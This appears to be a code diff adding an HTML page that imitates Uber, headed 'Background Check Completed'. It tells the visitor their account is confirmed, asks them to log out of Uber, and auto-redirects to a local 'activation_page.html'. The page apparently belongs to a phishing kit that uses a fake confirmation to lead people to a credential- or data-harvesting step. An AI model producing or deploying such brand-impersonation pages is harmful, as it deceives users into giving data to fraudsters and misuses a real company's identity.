@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Background Check Successful</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            font-family: Arial, sans-serif;
+            height: 100%;
+        }
+        .top-bar {
+            background-color: black;
+            height: 1.5cm;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+        .top-bar h1 {
+            color: white;
+            font-size: 2rem;
+            font-weight: 500;
+            margin: 0;
+        }
+        .content {
+            text-align: center;
+            font-size: 1.5rem;
+            color: black;
+            padding: 20px;
+        }
+        .success-message {
+            font-size: 2rem;
+            font-weight: bold;
+            color: green;
+            margin: 20px 0;
+        }
+        .footer {
+            margin-top: 50px;
+            padding: 20px;
+            background-color: #f2f2f2;
+            color: #808080;
+            text-align: left;
+            font-size: 1rem;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <h1>Uber</h1>
+    </div>
+    <div class="content">
+        <h2>Background Check Completed</h2>
+        <p class="success-message">
+            Your account has been confirmed. Please wait while we redirect you to the activation page. 
+        </p>
+        <p>
+            <strong>Important:</strong> Make sure to log out of your Uber account before you proceed.
+        </p>
+    </div>
+    <div class="footer">
+        By proceeding, you consent to receiving calls, WhatsApp, or SMS/RCS messages, including by automated means, from Uber and its affiliates to the number provided.
+    </div>
+    <script>
+        // Auto-redirect after 10 seconds
+        setTimeout(() => {
+            window.location.href = "activation_page.html"; // Replace with the actual activation page URL
+        }, 10000);
+    </script>
+</body>
+</html>
